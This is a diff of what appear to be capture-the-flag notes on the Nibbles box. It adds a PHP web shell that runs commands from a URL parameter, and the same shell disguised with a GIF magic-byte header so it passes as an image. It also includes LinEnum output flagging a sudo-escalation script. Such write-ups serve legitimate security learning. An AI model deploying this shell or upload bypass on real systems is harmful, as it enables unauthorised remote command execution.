@@ -66,7 +66,32 @@ db.xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?> <plugin name="Categories" author="Diego Najar" version="3.6" installed_at="1512926436"><position type="integer">0</position><title type="string">Categories</title></plugin>
 ```
 
-#LinEnum 
+# Image Upload
+
+```bash
+❯ cat shell.php
+─────────────────────────────────────────────────────────────────────────────────
+<?php system("id"); system($_GET[0]); ?>
+─────────────────────────────────────────────────────────────────────────────────
+
+
+❯ file shell.php
+shell.php: PHP script, ASCII text
+```
+
+```bash
+❯ cat shell.php
+─────────────────────────────────────────────────────────────────────────────────
+GIF8;
+<?php system("id"); system($_GET[0]); ?>────────────────────────────────────────────────────────────────────────────────
+
+
+❯ file shell.php
+shell.php: GIF image data 16188 x 26736
+```
+
+# LinEnum
+
 ```bash
 [+] We can sudo without supplying a password!
 Matching Defaults entries for nibbler on Nibbles:
@@ -78,5 +103,5 @@ User nibbler may run the following commands on Nibbles:
 
 [+] Possible sudo pwnage!
 /home/nibbler/personal/stuff/monitor.sh
-
 ```
+
